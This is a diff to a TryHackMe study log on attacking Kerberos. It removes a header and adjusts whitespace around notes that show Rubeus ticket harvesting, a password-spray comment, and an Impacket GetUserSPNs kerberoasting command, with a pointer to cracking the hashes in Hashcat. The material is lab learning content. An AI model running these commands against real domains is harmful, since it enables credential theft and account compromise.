@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2021-12-05-tryhackme-complete-be
 author: 100007
 ---
 
-# TryHackMe: Complete Beginner (Supplements)
-
-**author:** Nathan Acks  
-**date:** 2021-12-05
-
 # Attacking Kerberos
 
 ## Introduction
@@ -95,6 +90,7 @@ NOTE: To use Rebueus you need to already be on the domain you are attacking, or 
 # Probably works best when run on a domain controller.
 #
 Rubeus.exe harvest /interval:30
+
 # Spray the specified password across all known users and generate a
 # ticket giving ticket for successful authentications. (Can trigger
 # account lockouts!)
@@ -131,9 +127,9 @@ Impacket can identify kerberoastable accounts and dump packets remotely. It come
 
 ```
 sudo python3 \
-/usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
-${DOMAIN}/${USER}:${PASSWORD} \
--dc-ip $DOMAIN_CONTROLLER_IP -request
+     /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
+     ${DOMAIN}/${USER}:${PASSWORD} \
+     -dc-ip $DOMAIN_CONTROLLER_IP -request
 ```
 
 The password hashes output here can then be cracked with Hashcat (use the 13100 hash mode).
